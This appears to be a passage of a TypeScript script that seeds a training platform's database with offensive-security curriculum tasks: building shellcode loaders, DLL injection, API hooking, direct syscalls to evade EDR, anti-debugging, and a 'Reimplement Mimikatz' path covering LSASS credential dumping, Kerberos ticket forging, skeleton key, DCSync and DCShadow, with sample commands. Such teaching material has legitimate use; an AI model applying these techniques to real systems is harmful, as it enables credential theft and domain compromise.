		['Build shellcode loader', 'void* mem = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(mem, shellcode, size); ((void(*)())mem)(); Alternatively: CreateThread, callback functions, or fiber execution.', '## Loader\n\nVirtualAlloc\nmemcpy\nExecute in memory'],
		['Implement DLL injection', 'Classic: VirtualAllocEx in target, WriteProcessMemory with DLL path, CreateRemoteThread calling LoadLibraryA. Manual map: copy PE, resolve imports, call DllMain. Avoids LoadLibrary detection.', '## DLL Inject\n\nCreateRemoteThread\nLoadLibrary\nManual mapping'],
		['Add API hooking', 'IAT hook: modify Import Address Table entry. Inline hook: overwrite function prologue with JMP to hook (save original bytes). Microsoft Detours library for safe hooking. Hook NtCreateFile to monitor file access.', '## Hooks\n\nIAT hooking\nInline hooking\nDetour library'],
		['Build PE parser', 'Parse DOS header (e_magic=MZ), PE header (Signature=PE), Optional header (ImageBase, EntryPoint). Walk section headers (.text, .data). Parse Import Directory for DLL dependencies, Export Directory for functions.', '## PE\n\nParse headers\nSection enumeration\nImport/export tables'],
		['Implement syscalls', 'Bypass usermode hooks by calling ntdll syscalls directly. Read SSN from ntdll, build syscall stub: mov r10, rcx; mov eax, SSN; syscall; ret. Use SysWhispers tool to generate. Avoids EDR hooks.', '## Syscalls\n\nAvoid usermode hooks\nResolve SSN\nCall directly'],
		['Add anti-debug', 'IsDebuggerPresent() checks PEB.BeingDebugged. NtQueryInformationProcess for ProcessDebugPort. Timing: RDTSC, GetTickCount (debugger introduces delays). PEB.NtGlobalFlag (0x70 if debugger). Crash or exit if detected.', '## Anti-Debug\n\nIsDebuggerPresent\nPEB checks\nTiming checks'],
	] as [string, string, string][] },
]);

// Reimplement: Mimikatz (62)
expandPath(62, [
	{ name: 'Credential Extraction', desc: 'Memory extraction', tasks: [
		['Understand LSASS', 'LSASS (lsass.exe) is the Local Security Authority Subsystem. It handles authentication, stores NTLM hashes, Kerberos tickets, and sometimes plaintext passwords (WDigest). Protected Process Light (PPL) on newer Windows defends it.', '## LSASS\n\nLocal Security Authority\nStores credentials\nProtected process'],
		['Build LSASS accessor', 'Enable SeDebugPrivilege (admin required). OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsass_pid). Use NtReadVirtualMemory to read credential structures from LSASS memory.', '## Access\n\nSeDebugPrivilege\nOpenProcess\nRead memory'],
		['Implement sekurlsa module', 'Find credential structures: LogonSessionList, lsasrv!LogonSessionTable. Parse KIWI_MSV1_0_PRIMARY_CREDENTIALS for NTLM. Decrypt with 3DES/AES key from lsasrv. Extract usernames, domains, NTLM hashes.', '## Sekurlsa\n\nParse LSASS memory\nFind credential structures\nExtract passwords/hashes'],
		['Add wdigest extraction', 'WDigest stores reversible credentials when UseLogonCredential=1 (default on older Windows). Find KIWI_WDIGEST_CREDENTIALS in memory. Decrypt with wdigest!l_LogSessList key. Returns plaintext passwords.', '## Wdigest\n\nReversible encryption\nFind in memory\nDecrypt passwords'],
		['Build DPAPI module', 'DPAPI master keys decrypt credential files, browser passwords, WiFi passwords. Keys in %APPDATA%\\Microsoft\\Protect\\{SID}. Decrypt with user password or domain backup key (DPAPI_SYSTEM from DC).', '## DPAPI\n\nMaster keys\nCredential files\nDecryption'],
		['Implement Kerberos module', 'Find KIWI_KERBEROS_LOGON_SESSION in LSASS for cached tickets. Export TGT/TGS in .kirbi format (base64 encoded). Use for pass-the-ticket: inject into session for authentication without password.', '## Kerberos\n\nFind tickets in memory\nExport to file\nPass-the-ticket'],
	] as [string, string, string][] },
	{ name: 'Advanced Attacks', desc: 'Kerberos attacks', tasks: [
		['Build golden ticket', 'Forge TGT with krbtgt NTLM hash: kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:hash. Valid for 10 years by default. Complete domain compromise.', '## Golden\n\nkrbtgt hash\nForge TGT\n10-year validity'],
		['Implement silver ticket', 'Forge TGS with service account hash: /service:cifs /target:server.corp.com /rc4:hash. Access specific service without touching DC. Example: CIFS for file shares, HTTP for web services.', '## Silver\n\nService account hash\nForge TGS\nTarget specific service'],
		['Add skeleton key', 'misc::skeleton patches LSASS on DC. After patching, any account accepts "mimikatz" as password (in addition to real password). Survives until reboot. Very noisy but effective for persistence.', '## Skeleton\n\nPatch LSASS\nAny password works\nMaster key'],
		['Build DCSync', 'lsadump::dcsync /domain:corp.com /user:Administrator. Uses DRSUAPI replication protocol (what DCs use). Requires Replicating Directory Changes rights. Dumps all hashes without touching NTDS.dit file.', '## DCSync\n\nDRSGetNCChanges\nDump all hashes\nNo code on DC'],
		['Implement DCShadow', 'Register machine as temporary DC, push malicious changes (add admin, modify ACLs), then de-register. Changes replicate to real DCs. Very stealthy: looks like normal replication. Requires DA.', '## DCShadow\n\nRegister rogue DC\nPush malicious changes\nStealthy persistence'],
		['Add token manipulation', 'token::elevate for SYSTEM. token::duplicate copies token. token::impersonate uses stolen token. privilege::debug enables SeDebugPrivilege. Use to run commands as other users without their password.', '## Tokens\n\nDuplicate token\nImpersonate user\nPrivilege escalation'],
	] as [string, string, string][] },
]);

console.log('Done expanding remaining paths!');

const finalCount = db.prepare(`
	SELECT COUNT(*) as paths,
	(SELECT COUNT(*) FROM modules) as modules,
	(SELECT COUNT(*) FROM tasks) as tasks
	FROM paths
`).get() as { paths: number; modules: number; tasks: number };

console.log(`Final counts: ${finalCount.paths} paths, ${finalCount.modules} modules, ${finalCount.tasks} tasks`);

db.close();
